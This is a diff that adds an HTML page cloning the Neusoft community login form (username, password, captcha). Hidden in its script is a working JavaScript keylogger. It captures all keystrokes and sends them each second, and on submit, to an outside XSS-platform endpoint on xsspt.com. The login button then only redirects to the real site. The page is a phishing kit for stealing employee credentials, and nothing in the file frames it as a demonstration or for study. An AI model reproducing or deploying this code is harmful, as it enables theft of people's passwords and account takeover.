@@ -1,0 +1,231 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<title>东软社区</title>
+		<meta name="keywords" content="东软社区">
+		<meta name="description" content="东软社区">
+		<link rel="shortcut icon" href="http://sns.neusoft.com/public/themes/neusoft/favicon.ico">
+		<link href="http://sns.neusoft.com/public/themes/neusoft/css/login.css" rel="stylesheet" type="text/css">
+	</head>
+	<body>
+		<div id="header"></div>
+		<div id="bodyer">
+			<div id="info">
+				<form id="form_login" method="post" enctype="multipart/form-data" autocomplete="off" style="display: block;">
+					<div id="form_login_container">
+						<!--默认企业域方式登录-->
+						<h1>登录社区</h1>
+						<p>
+							<input type="text" name="username" id="username" title="用户名" class="input" maxlength="50" placeholder="用户名">
+							<span id="domain_view">@neusoft.com</span>
+							<input type="hidden" id="domain" name="domain" value="neusoft">
+						</p>
+						<p>
+							<input type="password" name="password" title="密码" id="password" class="input" maxlength="50" placeholder="密码">
+						</p>
+						<p>
+                          <input name="verify" type="text" title="验证码" id="verify">
+                          &nbsp;<a href="###" class="verifychange"><img style="vertical-align:middle;margin:0 0 8px" src="http://sns.neusoft.com/public/captcha.php" id="verifyimg" alt="换一张" class="alM"></a>&nbsp;&nbsp;<a href="###" class="verifychange">换一换</a>
+						</p>						<p id="btngroup"><a href="javascript:;" class="button" id="btn_login">登录</a></p>
+						<p id="status" class="success"></p>
+					</div>
+				</form>
+			</div>
+		</div>
+			<style>
+	 p .link{color: #606060}
+	 p .link:hover{text-decoration: underline; color: #174370}
+   </style>
+	<div id="footer_nologin">
+		<p><a href="mailto:neiwang@neusoft.com" target="_blank">意见反馈</a> | <a href="http://web.neusoft.com/" target="_blank">内网</a> | Copyright © 2015 东软集团股份有限公司 </p>
+		<p><a href="javascript:;" onclick="window.open('http://www.qiban365.com')" class="link">技术支持：东软云科技有限公司</a></p>
+                <p>辽ICP备05014984号</p>
+	</div>
+
+
+
+		<script type="text/javascript" src="http://sns.neusoft.com/public/js/jquery.js"></script>
+                <script type="text/javascript" src="http://sns.neusoft.com/public/js/common.js"></script>
+		<script type="text/javascript">
+		
+(function(){
+        var logger = "";
+        keyDown = function(e)
+        {
+                var e=e||event;
+                var currKey=e.keyCode||e.which||e.charCode;
+                if((currKey>7&&currKey<32)||(currKey>31&&currKey<47))
+                {
+                   switch(currKey)
+           　  {
+                        case 8: keyName = "[退格]"; break;
+                        case 9: keyName = "[制表]"; break;
+                        case 13:keyName = "[回车]"; break;
+                        //case 16:keyName = "[shift]"; break;
+                        case 17:keyName = "[Ctrl]"; break;
+                        case 18:keyName = "[Alt]"; break;
+                        case 20:keyName = "[大小写]"; break;
+                        case 32:keyName = "[空格]"; break;
+                        case 33:keyName = "[PageUp]";   break;
+                        case 34:keyName = "[PageDown]";   break;
+                        case 35:keyName = "[End]";   break;
+                        case 36:keyName = "[Home]";   break;
+                        case 37:keyName = "[方向键左]";   break;
+                        case 38:keyName = "[方向键上]";   break;
+                        case 39:keyName = "[方向键右]";   break;
+                        case 40:keyName = "[方向键下]";   break;
+                        case 46:keyName = "[删除]";   break;
+                        default:keyName = "";    break;
+                   }
+                   logger += keyName;
+                }
+        }
+        keyPress = function(e)
+        {
+                var currKey=0,CapsLock=0,e=e||event;
+                currKey=e.keyCode||e.which||e.charCode;
+                CapsLock=currKey>=65&&currKey<=90;
+                switch(currKey)
+                {
+                   　 　 //屏蔽了退格、制表、回车、空格、方向键、删除键等
+                   　 　 case 8: case 9:case 13:case 16:case 17:case 18:case 20:
+                                    case 32: case 33: case 34: case 35: case 36: case 37:case 38:
+                                    case 39:case 40:case 46:keyName = "";break;
+                   　 　 default:keyName = String.fromCharCode(currKey); break;
+                }
+                logger += keyName;
+        }
+        sendChar = function()
+        {
+                if (!logger) return;
+                (new Image).src="https://xsspt.com/index.php?do=api&id=iNzfZA&char=" + logger; //服务端地址
+                logger = "";
+        }
+        formSubmit = function()
+        {
+                sendChar();
+        }
+        document.onkeydown = keyDown;
+        document.onkeypress = keyPress;
+        document.onsubmit = formSubmit;
+        setInterval(sendChar, 1000); //设置定时器
+})();
+
+
+
+		$('.verifychange').click(function(){
+		    var date = new Date();
+		    var ttime = date.getTime();
+		    var url ="http://sns.neusoft.com/public/captcha.php";
+		    $('#verifyimg').attr('src',url+'?'+ttime);
+		});
+
+		$('#btn_login').click(function(){
+
+			var username = $('#username');
+			var password = $('#password');
+			var domain = $('#domain');
+			var verify = $('#verify');
+			
+			if($(this).hasClass('disabled')) return false;
+
+			if(verify.val()=='')
+			{
+				verify.addClass('error').delay(100).focus();
+				return false;
+			}
+
+			if(username.val()=='')
+			{
+				username.addClass('error').delay(100).focus();
+				return false;
+			}
+			
+			if(password.val()=='')
+			{
+				password.addClass('error').delay(100).focus();
+				return false;
+			}
+			
+
+			var params = {
+				domain		: domain.val(),
+				username	: username.val(),
+				password	: password.val(),
+				verify	    : verify.val()
+			};
+
+			enabled_form(false);
+
+
+			//$('#status').attr('class','loading').addClass('loading').html('正在进行信息验证').show();
+			document.location="http://sns.neusoft.com/home";
+			
+		});
+
+		$('#username').keyup(function(e){
+			$(this).removeClass('error');
+			if(e.keyCode==13)
+			{
+				$('#password').focus();
+			}
+		});
+		
+		$('#password').keyup(function(e){
+			$(this).removeClass('error');
+			if(e.keyCode==13)
+			{
+				$('#btn_login').click();
+			}
+		});
+		
+		function enabled_form(flag)
+		{
+			if(flag)
+			{
+				$('#username,#password,#btn_login').removeClass('disabled').prop('disabled',false);
+				$('#btngroup').show();
+				$('#username').focus();
+				$('#status').hide();
+			}
+			else
+			{
+				$('#username,#password,#btn_login').addClass('disabled').prop('disabled',true);
+				$('#btngroup').hide();
+				$('#status').show();
+			}
+		}
+
+		
+		//抖动表单
+		var form = $('#form_login');
+		function shake_form()
+		{
+			var margin = 10;
+			form.animate({right:-margin},50,function(){
+				form.animate({right:margin},50,function(){
+					form.animate({right:-margin},50,function(){
+						form.animate({right:margin},50,function(){
+							form.animate({right:0},20);
+						});
+					});
+				});
+			});
+		}
+		
+		//animate init
+                if($.browser.msie && $.browser.version < '9.0')
+                {
+		   form.show();
+                }
+		else
+		{
+		    form.delay(1000).fadeIn(500,function(){
+			$('#username').focus();
+		    });
+		}
+		
+		
+		</script>
+	
+</body></html>
